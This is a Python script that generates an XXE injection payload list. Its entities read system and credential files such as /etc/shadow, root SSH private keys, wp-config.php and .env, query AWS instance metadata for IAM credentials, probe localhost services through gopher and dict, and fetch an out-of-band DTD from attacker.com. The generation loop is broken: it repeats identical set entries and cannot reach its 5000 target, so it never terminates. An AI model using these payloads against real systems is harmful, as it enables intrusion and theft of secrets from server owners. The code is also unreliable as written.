#!/usr/bin/env python3
import os
import random

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def generate_xxe():
    p = set()

    # ========== 1. LINUX FILES (100+) ==========
    linux_files = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
        "/etc/issue", "/etc/os-release", "/etc/debian_version",
        "/etc/redhat-release", "/etc/centos-release", "/etc/fstab",
        "/etc/crontab", "/etc/shells", "/etc/group", "/etc/sudoers",
        "/etc/passwd-", "/etc/shadow-", "/etc/gshadow",
        "/etc/hosts.allow", "/etc/hosts.deny",
        "/etc/ssh/sshd_config", "/etc/ssh/ssh_config",
        "/etc/ssh/ssh_host_rsa_key", "/etc/ssh/ssh_host_dsa_key",
        "/etc/ssh/ssh_host_ecdsa_key", "/etc/ssh/ssh_host_ed25519_key",
        "/etc/apache2/httpd.conf", "/etc/apache2/apache2.conf",
        "/etc/apache2/ports.conf", "/etc/apache2/envvars",
        "/etc/apache2/sites-available/000-default.conf",
        "/etc/apache2/sites-enabled/000-default.conf",
        "/etc/nginx/nginx.conf", "/etc/nginx/sites-available/default",
        "/etc/nginx/sites-enabled/default",
        "/etc/httpd/conf/httpd.conf", "/etc/httpd/conf.d/ssl.conf",
        "/etc/mysql/my.cnf", "/etc/mysql/mysql.conf.d/mysqld.cnf",
        "/etc/mysql/debian.cnf", "/etc/mysql/conf.d/mysql.cnf",
        "/etc/postgresql/postgresql.conf", "/etc/postgresql/pg_hba.conf",
        "/etc/postgresql/pg_ident.conf",
        "/etc/redis/redis.conf", "/etc/mongodb.conf", "/etc/mongod.conf",
        "/etc/elasticsearch/elasticsearch.yml", "/etc/elasticsearch/jvm.options",
        "/etc/php/7.4/apache2/php.ini", "/etc/php/7.4/cli/php.ini",
        "/etc/php/7.4/fpm/php.ini", "/etc/php/7.4/php.ini",
        "/etc/php/8.0/apache2/php.ini", "/etc/php/8.0/cli/php.ini",
        "/etc/php/8.0/fpm/php.ini", "/etc/php/8.0/php.ini",
        "/etc/php/5.6/apache2/php.ini", "/etc/php/5.6/cli/php.ini",
        "/etc/php/5.6/fpm/php.ini", "/etc/php/5.6/php.ini",
        "/etc/phpmyadmin/config.inc.php", "/etc/phpmyadmin/config.inc.php.bak",
        "/etc/phpmyadmin/htpasswd",
        "/var/www/html/index.php", "/var/www/html/wp-config.php",
        "/var/www/html/wp-config.php.bak", "/var/www/html/config.php",
        "/var/www/html/config.php.bak", "/var/www/html/settings.php",
        "/var/www/html/settings.php.bak", "/var/www/html/.env",
        "/var/www/html/.htaccess", "/var/www/html/.htpasswd",
        "/var/www/html/.git/config", "/var/www/html/.git/index",
        "/var/www/html/.git/HEAD", "/var/www/html/.git/logs/HEAD",
        "/var/www/html/.git/refs/heads/main",
        "/var/www/html/.svn/entries", "/var/www/html/.svn/wc.db",
        "/var/www/html/.svn/format",
        "/var/www/html/composer.json", "/var/www/html/composer.lock",
        "/var/www/html/package.json", "/var/www/html/package-lock.json",
        "/var/www/html/yarn.lock",
        "/var/www/html/README.md", "/var/www/html/CHANGELOG.md",
        "/var/www/html/COPYING", "/var/www/html/LICENSE",
        "/var/www/html/.travis.yml", "/var/www/html/.gitignore",
        "/var/www/html/.dockerignore",
        "/var/www/html/Dockerfile", "/var/www/html/docker-compose.yml",
        "/var/www/html/robots.txt", "/var/www/html/sitemap.xml",
        "/var/www/html/.htaccess.bak", "/var/www/html/.htpasswd.bak",
        "/var/www/html/config.php.bak2", "/var/www/html/wp-config.php.bak2",
        "/var/www/html/backup/config.php", "/var/www/html/backup/wp-config.php",
        "/var/www/html/backup/.env", "/var/www/html/tmp/config.php",
        "/var/www/html/tmp/wp-config.php", "/var/www/html/tmp/.env",
        "/var/www/html/old/config.php", "/var/www/html/old/wp-config.php",
        "/var/www/html/old/.env", "/var/www/html/bak/config.php",
        "/var/www/html/bak/wp-config.php", "/var/www/html/bak/.env",
        "/var/www/html/includes/config.php", "/var/www/html/includes/db.php",
        "/var/www/html/admin/config.php", "/var/www/html/admin/settings.php",
        "/var/www/html/app/config.php", "/var/www/html/app/settings.php",
        "/var/www/html/src/config.php", "/var/www/html/src/settings.php",
        "/var/www/html/lib/config.php", "/var/www/html/lib/settings.php",
        "/var/www/html/core/config.php", "/var/www/html/core/settings.php",
        "/var/www/html/config/database.php", "/var/www/html/config/app.php",
        "/var/www/html/config/services.php", "/var/www/html/config/cache.php",
        "/var/www/html/config/session.php", "/var/www/html/config/mail.php",
        "/var/www/html/config/queue.php", "/var/www/html/config/logging.php",
        "/var/www/html/config/auth.php", "/var/www/html/config/broadcasting.php",
        "/var/www/html/config/cors.php", "/var/www/html/config/hashing.php",
        "/var/www/html/config/view.php", "/var/www/html/config/filesystems.php",
        "/var/www/html/config/sanctum.php", "/var/www/html/config/tinker.php",
        "/var/www/html/config/trustedproxy.php"
    ]

    # ========== 2. WINDOWS FILES (100+) ==========
    windows_files = [
        "C:/windows/win.ini", "C:/windows/system32/drivers/etc/hosts",
        "C:/windows/system32/drivers/etc/services",
        "C:/windows/system32/drivers/etc/networks",
        "C:/windows/system32/drivers/etc/protocol",
        "C:/windows/system32/drivers/etc/lmhosts",
        "C:/windows/system32/drivers/etc/hosts.sam",
        "C:/windows/system32/drivers/etc/hosts.ics",
        "C:/windows/system32/drivers/etc/hosts.old",
        "C:/windows/system32/drivers/etc/hosts.bak",
        "C:/windows/system32/drivers/etc/hosts.backup",
        "C:/windows/system32/drivers/etc/hosts.save",
        "C:/windows/system32/drivers/etc/hosts.tmp",
        "C:/windows/system32/drivers/etc/hosts.original",
        "C:/windows/system32/drivers/etc/hosts.org",
        "C:/windows/System32/drivers/etc/hosts",
        "C:/xampp/htdocs/index.php", "C:/xampp/htdocs/config.php",
        "C:/xampp/htdocs/wp-config.php", "C:/xampp/htdocs/.env",
        "C:/xampp/htdocs/.htaccess", "C:/xampp/htdocs/.htpasswd",
        "C:/xampp/htdocs/config.php.bak", "C:/xampp/htdocs/wp-config.php.bak",
        "C:/xampp/htdocs/.env.bak",
        "C:/xampp/htdocs/backup/config.php", "C:/xampp/htdocs/backup/wp-config.php",
        "C:/xampp/htdocs/backup/.env",
        "C:/xampp/apache/conf/httpd.conf",
        "C:/xampp/apache/conf/extra/httpd-vhosts.conf",
        "C:/xampp/apache/conf/extra/httpd-ssl.conf",
        "C:/xampp/mysql/bin/my.ini", "C:/xampp/php/php.ini",
        "C:/xampp/htdocs/config/database.php", "C:/xampp/htdocs/config/app.php",
        "C:/xampp/htdocs/config/services.php", "C:/xampp/htdocs/config/cache.php",
        "C:/xampp/htdocs/config/session.php", "C:/xampp/htdocs/config/mail.php",
        "C:/xampp/htdocs/config/queue.php", "C:/xampp/htdocs/config/logging.php",
        "C:/xampp/htdocs/config/auth.php", "C:/xampp/htdocs/config/broadcasting.php",
        "C:/xampp/htdocs/config/cors.php", "C:/xampp/htdocs/config/hashing.php",
        "C:/xampp/htdocs/config/view.php", "C:/xampp/htdocs/config/filesystems.php",
        "C:/xampp/htdocs/config/sanctum.php", "C:/xampp/htdocs/config/tinker.php",
        "C:/xampp/htdocs/config/trustedproxy.php",
        "C:/wamp/www/index.php", "C:/wamp/www/config.php",
        "C:/wamp/www/wp-config.php", "C:/wamp/www/.env",
        "C:/wamp/www/.htaccess",
        "C:/wamp/bin/apache/apache2.4.54/conf/httpd.conf",
        "C:/wamp/bin/mysql/mysql5.7.36/my.ini",
        "C:/wamp/bin/php/php7.4.33/php.ini",
        "C:/inetpub/wwwroot/index.php", "C:/inetpub/wwwroot/config.php",
        "C:/inetpub/wwwroot/wp-config.php", "C:/inetpub/wwwroot/.env",
        "C:/inetpub/wwwroot/.htaccess", "C:/inetpub/wwwroot/web.config",
        "C:/inetpub/wwwroot/backup/config.php",
        "C:/inetpub/wwwroot/backup/wp-config.php",
        "C:/inetpub/wwwroot/backup/.env",
        "C:/Users/Administrator/Desktop/config.php",
        "C:/Users/Administrator/Desktop/wp-config.php",
        "C:/Users/Administrator/Documents/config.php",
        "C:/Users/Administrator/Documents/wp-config.php",
        "C:/Users/User/Desktop/config.php", "C:/Users/User/Desktop/wp-config.php",
        "C:/Users/User/Documents/config.php", "C:/Users/User/Documents/wp-config.php",
        "C:/Program Files/Apache Software Foundation/Apache2.4/conf/httpd.conf",
        "C:/Program Files/Apache Software Foundation/Apache2.4/conf/extra/httpd-vhosts.conf",
        "C:/Program Files/MySQL/MySQL Server 5.7/my.ini",
        "C:/Program Files/PHP/php.ini",
        "C:/Program Files/nginx/conf/nginx.conf",
        "C:/Program Files/nginx/conf/sites-enabled/default"
    ]

    # ========== 3. PROCFS FILES (50+) ==========
    proc_files = [
        "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status",
        "/proc/self/cwd", "/proc/self/fd/0", "/proc/self/fd/1",
        "/proc/self/fd/2", "/proc/self/fd/3", "/proc/self/fd/4",
        "/proc/self/fd/5", "/proc/self/fd/6", "/proc/self/fd/7",
        "/proc/self/fd/8", "/proc/self/fd/9",
        "/proc/self/root/etc/passwd", "/proc/self/root/etc/shadow",
        "/proc/self/root/etc/hosts",
        "/proc/self/root/proc/self/environ",
        "/proc/self/root/var/www/html/config.php",
        "/proc/self/root/var/www/html/wp-config.php",
        "/proc/self/root/var/www/html/.env"
    ]

    # ========== 4. LOG FILES (30+) ==========
    log_files = [
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/apache2/access.log.1", "/var/log/apache2/error.log.1",
        "/var/log/apache2/access.log.2.gz", "/var/log/apache2/error.log.2.gz",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
        "/var/log/nginx/access.log.1", "/var/log/nginx/error.log.1",
        "/var/log/httpd/access_log", "/var/log/httpd/error_log",
        "/var/log/httpd/access_log.1", "/var/log/httpd/error_log.1",
        "/var/log/messages", "/var/log/syslog", "/var/log/auth.log",
        "/var/log/secure", "/var/log/maillog", "/var/log/cron",
        "/var/log/boot.log", "/var/log/dpkg.log", "/var/log/dpkg.log.1",
        "/var/log/apt/history.log", "/var/log/apt/term.log",
        "/var/log/apt/history.log.1", "/var/log/apt/term.log.1",
        "/var/log/wtmp", "/var/log/utmp", "/var/log/lastlog",
        "/var/log/faillog", "/var/log/kern.log", "/var/log/dmesg"
    ]

    # ========== 5. SSH FILES (10+) ==========
    ssh_files = [
        "/root/.bash_history", "/root/.bashrc", "/root/.profile",
        "/root/.ssh/id_rsa", "/root/.ssh/id_rsa.pub",
        "/root/.ssh/authorized_keys", "/root/.ssh/known_hosts",
        "/home/user/.bash_history", "/home/user/.bashrc",
        "/home/user/.profile", "/home/user/.ssh/id_rsa",
        "/home/user/.ssh/id_rsa.pub", "/home/user/.ssh/authorized_keys",
        "/home/user/.ssh/known_hosts"
    ]

    # ========== 6. AWS METADATA (15+) ==========
    aws_metadata = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/instance-type",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/public-keys/",
        "http://169.254.169.254/latest/meta-data/security-groups",
        "http://169.254.169.254/latest/meta-data/subnet-id",
        "http://169.254.169.254/latest/meta-data/vpc-id",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/00:11:22:33:44:55/vpc-id",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/00:11:22:33:44:55/subnet-id",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/00:11:22:33:44:55/security-groups"
    ]

    # ========== 7. HTTP/HTTPS/GOPHER/DICT (30+) ==========
    external = [
        "http://127.0.0.1", "http://127.0.0.1:80", "http://127.0.0.1:8080",
        "http://127.0.0.1:443", "http://127.0.0.1:22", "http://127.0.0.1:3306",
        "http://127.0.0.1:5432", "http://127.0.0.1:6379", "http://127.0.0.1:9200",
        "http://127.0.0.1:27017",
        "http://localhost", "http://localhost:80", "http://localhost:8080",
        "http://localhost:443", "http://localhost:22", "http://localhost:3306",
        "http://localhost:5432", "http://localhost:6379", "http://localhost:9200",
        "http://localhost:27017",
        "http://0.0.0.0", "http://0.0.0.0:80", "http://0.0.0.0:8080",
        "http://0.0.0.0:443",
        "https://127.0.0.1", "https://localhost",
        "gopher://127.0.0.1:80/_GET / HTTP/1.0",
        "gopher://127.0.0.1:80/_POST / HTTP/1.0%0aHost: 127.0.0.1%0aContent-Length: 0",
        "gopher://localhost:80/_GET / HTTP/1.0",
        "gopher://localhost:80/_POST / HTTP/1.0%0aHost: localhost%0aContent-Length: 0",
        "dict://127.0.0.1:80/info", "dict://localhost:80/info",
        "dict://127.0.0.1:80/stat", "dict://localhost:80/stat"
    ]

    # ========== 8. OOB (Out-of-Band) (20+) ==========
    oob = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"> %remote;]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com:8080/xxe.dtd"> %remote;]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://attacker.com/xxe.dtd"> %remote;]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"> %remote;%remote;]><root>&test;</root>'
    ]

    # ========== 9. GENERATE PAYLOAD ==========
    all_files = linux_files + windows_files + proc_files + log_files + ssh_files

    # Classic XXE
    for file_path in all_files:
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')

    # AWS Metadata
    for url in aws_metadata:
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "{url}">]><root>&test;</root>')

    # HTTP/HTTPS/Gopher/Dict
    for url in external:
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "{url}">]><root>&test;</root>')

    # OOB
    for o in oob:
        p.add(o)

    # ========== 10. RANDOM (SAMPAI 5000+) ==========
    while len(p) < 5000:
        file_path = random.choice(all_files)
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{file_path}">]><root>&test;</root>')

    # ========== 11. SAVE ==========
    with open(os.path.join(PAYLOAD_DIR, "xxe.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(p))
    print(f"[+] xxe.txt: {len(p)} payloads")

if __name__ == "__main__":
    generate_xxe()